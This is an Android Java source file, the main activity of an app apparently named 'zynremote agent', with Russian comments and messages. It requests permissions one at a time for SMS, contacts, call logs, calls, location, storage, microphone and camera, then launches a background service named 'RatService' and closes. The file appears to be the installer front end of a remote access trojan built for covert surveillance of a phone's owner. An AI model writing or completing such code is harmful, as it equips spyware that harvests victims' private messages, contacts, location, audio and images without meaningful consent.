package com.zynremote.agent;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String[] PERMS = {
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.POST_NOTIFICATIONS
    };

    private int currentIndex = 0;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        if (Build.VERSION.SDK_INT >= 23) {
            currentIndex = 0;
            requestNext();
        } else {
            startServiceAndFinish();
        }
    }

    private void requestNext() {
        // Ищем следующее НЕ выданное разрешение
        while (currentIndex < PERMS.length) {
            if (checkSelfPermission(PERMS[currentIndex]) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{PERMS[currentIndex]}, currentIndex);
                return;
            }
            currentIndex++;
        }
        // Все выданы
        Toast.makeText(this, "Все разрешения получены!", Toast.LENGTH_SHORT).show();
        startServiceAndFinish();
        new android.os.Handler().postDelayed(() -> finish(), 2000);
    }

    private void startServiceAndFinish() {
        try {
            Intent i = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= 26)
                startForegroundService(i);
            else
                startService(i);
        } catch (Throwable t) {
            Toast.makeText(this, "Ошибка сервиса: " + t.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] results) {
        super.onRequestPermissionsResult(req, perms, results);

        if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "OK: " + perms[0], Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Отклонено: " + perms[0], Toast.LENGTH_SHORT).show();
        }

        currentIndex++;
        requestNext();
    }
}
